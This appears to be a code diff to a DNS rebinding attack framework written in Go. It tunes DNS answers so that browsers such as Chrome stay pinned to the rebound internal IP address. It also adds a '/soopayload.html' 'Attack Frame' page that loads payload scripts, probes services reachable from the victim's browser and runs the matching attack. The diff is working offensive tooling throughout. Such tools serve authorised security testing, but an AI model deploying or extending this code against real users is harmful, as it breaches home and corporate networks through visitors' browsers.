@@ -6,11 +6,14 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"html/template"
 	"io/ioutil"
 	"log"
 	"math/rand"
 	"net"
 	"net/http"
+	"os"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"sync"
@@ -48,8 +51,8 @@ type AppConfig struct {
 	RebindingFnName              string
 	ResponseReboundIPAddrtimeOut int
 	AllowDynamicHTTPServers      bool
-	HTTPProxyServerPort          int
 	DNSServerBindAddr            string
+	WsHTTPProxyServerPort        int
 }
 
 // GenerateRandomString returns a secure random hexstring, 20 chars long
@@ -73,6 +76,7 @@ type DNSClientState struct {
 	ResponseReboundIPAddr        string
 	LastResponseReboundIPAddr    int
 	ResponseReboundIPAddrtimeOut int
+	FirewalledOnce               bool
 }
 
 // ExpireOldEntries expire DNS Client Sessions
@@ -248,8 +252,14 @@ func DNSRebindFromQueryRoundRobin(session string, dcss *DNSClientStateStore, q d
 // It extracts the two hosts in the DNS query string
 // then returns the extracted hosts as multiple DNS A records
 func DNSRebindFromQueryMultiA(session string, dcss *DNSClientStateStore, q dns.Question) []string {
+	var answers []string
 	dcss.RLock()
-	answers := []string{dcss.Sessions[session].ResponseIPAddr, dcss.Sessions[session].ResponseReboundIPAddr}
+	if dcss.Sessions[session].FirewalledOnce == true {
+		// we try to prevent browsers like Chrome for reverting back to first IP address
+		answers = []string{dcss.Sessions[session].ResponseReboundIPAddr}
+	} else {
+		answers = []string{dcss.Sessions[session].ResponseIPAddr, dcss.Sessions[session].ResponseReboundIPAddr}
+	}
 	dcss.RUnlock()
 	log.Printf("DNS: in DNSRebindFromQueryMultiA\n")
 	return answers
@@ -316,9 +326,9 @@ func MakeRebindDNSHandler(appConfig *AppConfig, dcss *DNSClientStateStore) dns.H
 
 					response := []string{}
 
-					respond := func(question string, answer string) string {
+					respond := func(question string, time string, answer string) string {
 						// we respond with one A record
-						response := fmt.Sprintf("%s 0 IN A %s", question, answer)
+						response := fmt.Sprintf("%s %s IN A %s", question, time, answer)
 						//otherwise we respond with a CNAME record if we do not have an IP address
 						if net.ParseIP(answer) == nil {
 							response = fmt.Sprintf("%s 10 IN CNAME %s.", question, answer)
@@ -327,10 +337,10 @@ func MakeRebindDNSHandler(appConfig *AppConfig, dcss *DNSClientStateStore) dns.H
 					}
 
 					if len(answers) == 1 { //we return only one answer
-						response = append(response, respond(q.Name, answers[0]))
+						response = append(response, respond(q.Name, "0", answers[0]))
 					} else { // We respond with multiple answers
-						response = append(response, fmt.Sprintf("%s 10 IN A %s", q.Name, answers[0]))
-						response = append(response, respond(q.Name, answers[1]))
+						response = append(response, respond(q.Name, "10", answers[0]))
+						response = append(response, respond(q.Name, "0", answers[1]))
 					}
 
 					dcss.Lock()
@@ -368,6 +378,14 @@ type HTTPClientInfoHandler struct {
 	Port      string
 }
 
+// PayloadTemplateHandler is a HTTP handler to deliver payloads to HTTP clients
+type PayloadTemplateHandler struct {
+}
+
+type templatePayloadData struct {
+	JavaScriptCode template.JS
+}
+
 // HTTPServerStoreHandler holds the list of HTTP servers
 // Many servers at startup and one (1) dynamically instantianted server
 // Access to the servers list must be performed via mutex
@@ -375,12 +393,12 @@ type HTTPServerStoreHandler struct {
 	Errc                    chan HTTPServerError // communicates http server errors
 	AllowDynamicHTTPServers bool
 	sync.RWMutex
-	DynamicServers      []*http.Server
-	StaticServers       []*http.Server
-	Dcss                *DNSClientStateStore
-	Wscss               *WebsocketClientStateStore
-	HTTPProxyServerPort int
-	AuthToken           string
+	DynamicServers        []*http.Server
+	StaticServers         []*http.Server
+	Dcss                  *DNSClientStateStore
+	Wscss                 *WebsocketClientStateStore
+	WsHTTPProxyServerPort int
+	AuthToken             string
 }
 
 // IPTablesHandler is a HTTP handler that adds/removes iptables rules
@@ -407,6 +425,7 @@ func (d *DefaultHeadersHandler) ServeHTTP(w http.ResponseWriter, r *http.Request
 	w.Header().Set("Pragma", "no-cache")                                   // HTTP 1.0
 	w.Header().Set("Expires", "0")                                         // Proxies
 	w.Header().Set("X-DNS-Prefetch-Control", "off")                        //Chrome
+	w.Header().Set("X-Singularity-Of-Origin", "t")
 	d.NextHandler.ServeHTTP(w, r)
 }
 
@@ -429,6 +448,75 @@ func (hcih *HTTPClientInfoHandler) ServeHTTP(w http.ResponseWriter, r *http.Requ
 		http.Error(w, string(emptyResponse), 400)
 		return
 	}
+}
+
+//https://siongui.github.io/2016/03/06/go-concatenate-js-files/
+func concatenateJS(dirPath string) []byte {
+	var jsCode []byte
+	// walk all files in directory
+	filepath.Walk(dirPath, func(path string, info os.FileInfo, err error) error {
+		if !info.IsDir() && strings.HasSuffix(info.Name(), ".js") {
+			log.Printf("HTTP: concatenating %v ...", path)
+			b, err := ioutil.ReadFile(path)
+			if err != nil {
+				return err
+			}
+			jsCode = append(jsCode, b...)
+		}
+		return nil
+	})
+	return jsCode
+}
+
+// HTTP Handler for "/soopayload"
+func (pth *PayloadTemplateHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
+	log.Printf("HTTP: %v %v from %v", r.Method, r.RequestURI, r.RemoteAddr)
+
+	const tpl = `<!doctype html>
+	<html><head><title>Attack Frame</title><script src="payload.js"></script>
+	<script>
+	{{ .JavaScriptCode }}
+
+	function attack(payload, headers, cookie, body, wsproxyport) {
+		const titleEl = document.getElementById('title');
+		if (payload === 'automatic') {
+			(async function loop() {
+				for (let payload in Registry) {
+					console.log("Trying payload: " + payload + " for frame: " + window.location);
+					await Registry[payload].isService(headers, cookie, body)
+						.then(response => {
+							if (response === true) {
+								titleEl.innerText = payload;
+								console.log("Payload: " + payload + " has identified a service for frame: " + window.location);
+								Registry[payload].attack(headers, cookie, body, wsproxyport);
+								return;
+							} else {
+								console.log("Payload: " + payload + " has rejected a service for frame: " + window.location);
+							}
+						})
+				}
+			})();
+		} else {
+			titleEl.innerText = payload;
+			Registry[payload].attack(headers, cookie, body, wsproxyport);
+		}
+	}
+	</script></head>
+	<body onload="begin('/')")><h3 id='title'>Rebinding...</h3>
+	<p><span id='hostname'></span>. <span id='rebindingstatus'>This page is waiting for a DNS update.</span>
+	<span id='payloadstatus'></span></p>
+	</body></html>`
+
+	check := func(err error) {
+		if err != nil {
+			log.Fatal(err)
+		}
+	}
+	t, err := template.New("webpage").Parse(tpl)
+	check(err)
+	templateData := templatePayloadData{JavaScriptCode: template.JS(concatenateJS("html/payloads"))}
+	err = t.Execute(w, templateData)
+	check(err)
 }
 
 // HTTP Handler for /servers
@@ -607,12 +695,12 @@ func NewHTTPServer(port int, hss *HTTPServerStoreHandler, dcss *DNSClientStateSt
 	wscss *WebsocketClientStateStore) *http.Server {
 	d := &DefaultHeadersHandler{NextHandler: http.FileServer(http.Dir("./html"))}
 	hcih := &HTTPClientInfoHandler{}
+	pth := &PayloadTemplateHandler{}
+	dpth := &DefaultHeadersHandler{NextHandler: pth}
 	ipth := &IPTablesHandler{}
 	delayDOMLoadHandler := &DelayDOMLoadHandler{}
-	websocketHandler := &WebsocketHandler{dcss: dcss, wscss: wscss}
-	//hookedClientHandler := &hookedClientHandler{wscss: wscss, httpProxyServerPort: hss.HTTPProxyServerPort}
-	//hookedClientAuthHander := &AuthHandler{Username: "Singularity of Origin", Password: hss.BasicAuthPassword,
-	//	Realm: "Hooked Clients", NextHandler: hookedClientHandler}
+	//websocketHandler := &WebsocketHandler{dcss: dcss, wscss: wscss}
+
 	h := http.NewServeMux()
 
 	h.HandleFunc("/", func(w http.ResponseWriter, req *http.Request) {
@@ -640,6 +728,9 @@ func NewHTTPServer(port int, hss *HTTPServerStoreHandler, dcss *DNSClientStateSt
 			if name.DNSRebindingStrategy == "ma" {
 				if elapsed > (time.Second * time.Duration(3)) {
 					log.Printf("HTTP: attempting Multiple A records rebinding for: %v", name)
+					dcss.Lock()
+					dcss.Sessions[name.Session].FirewalledOnce = true
+					dcss.Unlock()
 					ipth.ServeHTTP(w, req)
 					return
 				}
@@ -649,11 +740,10 @@ func NewHTTPServer(port int, hss *HTTPServerStoreHandler, dcss *DNSClientStateSt
 	})
 
 	h.Handle("/clientinfo", hcih)
+	h.Handle("/soopayload.html", dpth)
 	h.Handle("/servers", hss)
 	h.Handle("/delaydomload", delayDOMLoadHandler)
-	//h.Handle("/sooproxy/", proxyHandler)
-	h.Handle("/soows", websocketHandler)
-	//h.Handle("/soohooked", hookedClientAuthHander)
+	//h.Handle("/soows", websocketHandler)
 
 	httpServer := &http.Server{Addr: ":" + strconv.Itoa(port), Handler: h}
 
